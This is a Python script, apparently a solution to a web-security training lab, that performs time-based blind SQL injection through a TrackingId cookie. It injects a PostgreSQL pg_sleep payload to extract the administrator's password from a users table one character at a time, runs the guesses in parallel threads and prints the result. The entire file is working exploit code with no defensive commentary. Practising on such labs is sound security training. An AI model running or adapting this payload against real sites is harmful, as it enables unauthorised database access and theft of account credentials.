import requests
import string
import concurrent.futures
import time

url = "https://0aa3003b03cb89b3803db7b300c500d7.web-security-academy.net/"
cookievalue = ""
password = ""
cookies = {"TrackingId": cookievalue}
characters = list(string.ascii_lowercase)
characters = characters + list(string.digits)


def guess_password(i, char):
    cookievalue = "X' || (SELECT CASE WHEN (SUBSTR(password, {},1) = '{}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator') ||'--".format(
        i, char
    )
    cookies = {"TrackingId": cookievalue}

    start_time = time.time()

    r = requests.get(url, cookies=cookies)

    end_time = time.time()
    response_time = end_time - start_time

    if response_time > 5:
        return char
    return None


with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(1, 21):
        future_to_char = {
            executor.submit(guess_password, i, char): char for char in characters
        }
        for future in concurrent.futures.as_completed(future_to_char):
            char = future_to_char[future]
            try:
                result = future.result()
                if result is not None:
                    print(result)
                    password = password + result
            except Exception as exc:
                print("%r generated an exception: %s" % (char, exc))

print("Password is: " + password)
